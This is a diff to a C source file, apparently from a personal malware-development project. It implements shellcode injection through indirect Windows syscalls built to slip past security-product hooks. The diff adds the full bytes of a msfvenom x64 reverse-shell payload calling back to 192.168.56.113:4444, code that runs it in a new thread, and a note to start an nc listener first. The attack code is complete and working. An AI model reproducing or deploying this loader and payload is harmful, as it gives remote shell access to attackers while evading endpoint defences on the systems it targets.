@@ -39,7 +39,12 @@
  * ✅ Compatibilité avec toutes les versions Windows (extraction dynamique)
  *
  * COMPILATION :
- * gcc -o syscalls_indirect.exe syscalls_indirect.c -lntdll
+ * cd "c:\Users\zak28\OneDrive\Bureau\CETP\Malware Development\01_Projects\Syscall\Code"
+ * gcc -c dosyscall.S -o dosyscall.o
+ * gcc -Wall -O2 -DCOMPILE_DEMO_INDIRECT -c syscalls_indirect.c -o syscalls_indirect.o
+ * gcc syscalls_indirect.o dosyscall.o -o syscalls_indirect.exe -lntdll -s
+ * 
+ * ou : gcc -c dosyscall.S -o dosyscall.o && gcc -Wall -O2 -DCOMPILE_DEMO_INDIRECT -c syscalls_indirect.c -o syscalls_indirect.o && gcc syscalls_indirect.o dosyscall.o -o syscalls_indirect.exe -lntdll -s
  *
  * ============================================================================
  */
@@ -410,33 +415,45 @@ VOID PrintSuccess(const char *message)
 // ============================================================================
 
 /*
- * DoSyscall - Fonction assembleur inline simplifiée
- * 
- * Cette fonction prépare les registres et effectue le syscall indirect
- * 
- * Paramètres (fastcall x64):
- *   RCX = SSN
- *   RDX = Adresse syscall
- *   R8  = Argument 1
- *   R9  = Argument 2
- *   Stack = Arguments suivants
+ * DoSyscall - Fonction assembleur externe
+ * ----------------------------------------
+ * Implémentée dans dosyscall.asm pour éviter les problèmes de syntaxe
+ * Effectue un syscall indirect via une adresse dans ntdll
+ *
+ * Paramètres:
+ *   ssn         : System Service Number
+ *   syscallAddr : Adresse de l'instruction syscall dans ntdll
+ *   arg1-arg6   : Arguments du syscall
+ *
+ * Retourne: NTSTATUS du syscall
  */
-__attribute__((naked))
-NTSTATUS DoSyscall(DWORD ssn, PVOID syscallAddr, ...)
-{
-    __asm__(
-        "mov r10, r8\n"        // R10 = premier argument (R8)
-        "mov eax, ecx\n"       // EAX = SSN (RCX)
-        // RDX contient déjà syscallAddr
-        "mov rcx, r9\n"        // RCX = deuxième argument (R9)
-        "mov r8, [rsp+0x28]\n" // R8 = troisième argument
-        "mov r9, [rsp+0x30]\n" // R9 = quatrième argument
-        "sub rsp, 0x28\n"      // Shadow space
-        "call rdx\n"           // Appel indirect via ntdll
-        "add rsp, 0x28\n"
-        "ret\n"
-    );
-}
+extern NTSTATUS DoSyscall(
+    DWORD ssn,
+    PVOID syscallAddr,
+    PVOID arg1,
+    PVOID arg2,
+    PVOID arg3,
+    PVOID arg4,
+    PVOID arg5,
+    PVOID arg6);
+
+/*
+ * DoSyscall11 - Version étendue pour 11 arguments (NtCreateThreadEx)
+ */
+extern NTSTATUS DoSyscall11(
+    DWORD ssn,
+    PVOID syscallAddr,
+    PVOID arg1,
+    PVOID arg2,
+    PVOID arg3,
+    PVOID arg4,
+    PVOID arg5,
+    PVOID arg6,
+    PVOID arg7,
+    PVOID arg8,
+    PVOID arg9,
+    PVOID arg10,
+    PVOID arg11);
 
 // ============================================================================
 // IMPLÉMENTATION DES SYSCALLS INDIRECTS
@@ -456,17 +473,16 @@ NTSTATUS NtAllocateVirtualMemory_Indirect(
     ULONG Protect)
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];
-    
+
     return DoSyscall(
         info->ssn,
         info->syscallAddress,
-        ProcessHandle,
-        BaseAddress,
-        ZeroBits,
-        RegionSize,
-        AllocationType,
-        Protect
-    );
+        (PVOID)ProcessHandle,
+        (PVOID)BaseAddress,
+        (PVOID)ZeroBits,
+        (PVOID)RegionSize,
+        (PVOID)(ULONG_PTR)AllocationType,
+        (PVOID)(ULONG_PTR)Protect);
 }
 
 NTSTATUS NtWriteVirtualMemory_Indirect(
@@ -481,13 +497,12 @@ NTSTATUS NtWriteVirtualMemory_Indirect(
     return DoSyscall(
         info->ssn,
         info->syscallAddress,
-        ProcessHandle,
+        (PVOID)ProcessHandle,
         BaseAddress,
         Buffer,
-        NumberOfBytesToWrite,
-        NumberOfBytesWritten,
-        0  // Padding pour alignement
-    );
+        (PVOID)NumberOfBytesToWrite,
+        (PVOID)NumberOfBytesWritten,
+        NULL);
 }
 
 NTSTATUS NtProtectVirtualMemory_Indirect(
@@ -502,13 +517,12 @@ NTSTATUS NtProtectVirtualMemory_Indirect(
     return DoSyscall(
         info->ssn,
         info->syscallAddress,
-        ProcessHandle,
-        BaseAddress,
-        RegionSize,
-        NewProtect,
-        OldProtect,
-        0  // Padding
-    );
+        (PVOID)ProcessHandle,
+        (PVOID)BaseAddress,
+        (PVOID)RegionSize,
+        (PVOID)(ULONG_PTR)NewProtect,
+        (PVOID)OldProtect,
+        NULL);
 }
 
 NTSTATUS NtCreateThreadEx_Indirect(
@@ -526,21 +540,20 @@ NTSTATUS NtCreateThreadEx_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateThreadEx];
 
-    return DoSyscall(
+    return DoSyscall11(
         info->ssn,
         info->syscallAddress,
-        ThreadHandle,
-        DesiredAccess,
-        ObjectAttributes,
-        ProcessHandle,
-        StartRoutine,
-        Argument,
-        CreateFlags,
-        ZeroBits,
-        StackSize,
-        MaximumStackSize,
-        AttributeList
-    );
+        (PVOID)ThreadHandle,
+        (PVOID)DesiredAccess,
+        (PVOID)ObjectAttributes,
+        (PVOID)ProcessHandle,
+        (PVOID)StartRoutine,
+        (PVOID)Argument,
+        (PVOID)(ULONG_PTR)CreateFlags,
+        (PVOID)ZeroBits,
+        (PVOID)StackSize,
+        (PVOID)MaximumStackSize,
+        (PVOID)AttributeList);
 }
 
 NTSTATUS NtWaitForSingleObject_Indirect(
@@ -553,11 +566,10 @@ NTSTATUS NtWaitForSingleObject_Indirect(
     return DoSyscall(
         info->ssn,
         info->syscallAddress,
-        Handle,
+        (PVOID)Handle,
         (PVOID)(ULONG_PTR)Alertable,
-        Timeout,
-        0, 0, 0  // Padding
-    );
+        (PVOID)Timeout,
+        NULL, NULL, NULL);
 }
 
 NTSTATUS NtClose_Indirect(
@@ -568,9 +580,8 @@ NTSTATUS NtClose_Indirect(
     return DoSyscall(
         info->ssn,
         info->syscallAddress,
-        Handle,
-        0, 0, 0, 0, 0  // Padding
-    );
+        (PVOID)Handle,
+        NULL, NULL, NULL, NULL, NULL);
 }
 
 // ============================================================================
@@ -592,24 +603,46 @@ int main()
         return 1;
     }
 
-    // Shellcode de test (calc.exe par exemple)
+    // Shellcode msfvenom: windows/x64/shell_reverse_tcp LHOST=192.168.56.113 LPORT=4444
+    // ATTENTION: Démarrer listener avant: nc -lvnp 4444 sur 192.168.56.113
     unsigned char shellcode[] =
-        "\x48\x31\xc9"                             // xor rcx, rcx
-        "\x48\x81\xe9\xc6\xff\xff\xff"             // sub rcx, -0x3A
-        "\x48\x8d\x05\xef\xff\xff\xff"             // lea rax, [rip-0x11]
-        "\x48\x31\xd2"                             // xor rdx, rdx
-        "\x48\xbb\x63\x61\x6c\x63\x2e\x65\x78\x65" // movabs rbx, "calc.exe"
-        "\x53"                                     // push rbx
-        "\x54"                                     // push rsp
-        "\x59"                                     // pop rcx
-        "\x48\x83\xec\x28"                         // sub rsp, 0x28
-        "\x65\x48\x8b\x32"                         // mov rsi, gs:[rdx]
-        "\x48\x8b\x76\x18"                         // mov rsi, [rsi+0x18]
-        "\x48\x8b\x76\x10"                         // mov rsi, [rsi+0x10]
-        // ... (shellcode tronqué pour l'exemple)
-        "\xc3"; // ret
-
+        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x38\x71"
+        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+    
     SIZE_T shellcodeSize = sizeof(shellcode);
+    printf("    [*] Reverse shell shellcode: %zu bytes (192.168.56.113:4444)\n", shellcodeSize);
+    printf("    [!] Make sure listener is active: nc -lvnp 4444\n\n");
 
     // INJECTION AVEC SYSCALLS INDIRECTS
     printf("[*] Injecting shellcode using indirect syscalls...\n\n");
@@ -617,6 +650,10 @@ int main()
     // Allouer
     PVOID baseAddress = NULL;
     SIZE_T regionSize = shellcodeSize;
+
+    printf("[DEBUG] About to call NtAllocateVirtualMemory_Indirect\n");
+    printf("        shellcodeSize=%llu, regionSize=%llu\n", (unsigned long long)shellcodeSize, (unsigned long long)regionSize);
+
     NTSTATUS status = NtAllocateVirtualMemory_Indirect(
         GetCurrentProcess(),
         &baseAddress,
@@ -624,6 +661,8 @@ int main()
         &regionSize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE);
+
+    printf("[DEBUG] Returned from NtAllocateVirtualMemory_Indirect: status=0x%08lX\n", status);
 
     if (!NT_SUCCESS(status))
     {
@@ -633,8 +672,17 @@ int main()
     }
     PrintSuccess("Memory allocated");
     printf("    Address: 0x%p\n\n", baseAddress);
+    
+    // DEBUG: Vérifier le shellcode avant l'écriture
+    printf("[DEBUG] Shellcode buffer address: 0x%p, size: %zu\n", shellcode, shellcodeSize);
+    printf("[DEBUG] First 20 bytes: ");
+    for (size_t i = 0; i < 20 && i < shellcodeSize; i++) {
+        printf("%02X ", (unsigned char)shellcode[i]);
+    }
+    printf("\n\n");
 
     // Écrire
+    printf("[DEBUG] About to call NtWriteVirtualMemory_Indirect\n");
     SIZE_T bytesWritten = 0;
     status = NtWriteVirtualMemory_Indirect(
         GetCurrentProcess(),
@@ -642,6 +690,9 @@ int main()
         shellcode,
         shellcodeSize,
         &bytesWritten);
+    
+    printf("[DEBUG] Returned from NtWriteVirtualMemory_Indirect: status=0x%08lX\n", status);
+    printf("        bytesWritten=%zu\n\n", bytesWritten);
 
     if (!NT_SUCCESS(status))
     {
@@ -669,6 +720,9 @@ int main()
     PrintSuccess("Memory protection changed to RX");
 
     // Créer un thread
+    printf("[DEBUG] About to call NtCreateThreadEx_Indirect\n");
+    printf("        StartAddress=0x%p\n\n", baseAddress);
+    
     HANDLE hThread;
     status = NtCreateThreadEx_Indirect(
         &hThread,
@@ -682,6 +736,8 @@ int main()
         0,
         0,
         NULL);
+    
+    printf("[DEBUG] Returned from NtCreateThreadEx_Indirect: status=0x%08lX\n", status);
 
     if (!NT_SUCCESS(status))
     {
@@ -692,7 +748,9 @@ int main()
     PrintSuccess("Thread created and shellcode executed!");
 
     // Attendre et nettoyer
+    printf("[DEBUG] Waiting for thread...\n");
     NtWaitForSingleObject_Indirect(hThread, FALSE, NULL);
+    printf("[DEBUG] Thread finished\n");
     NtClose_Indirect(hThread);
 
     CleanupIndirectSyscalls();
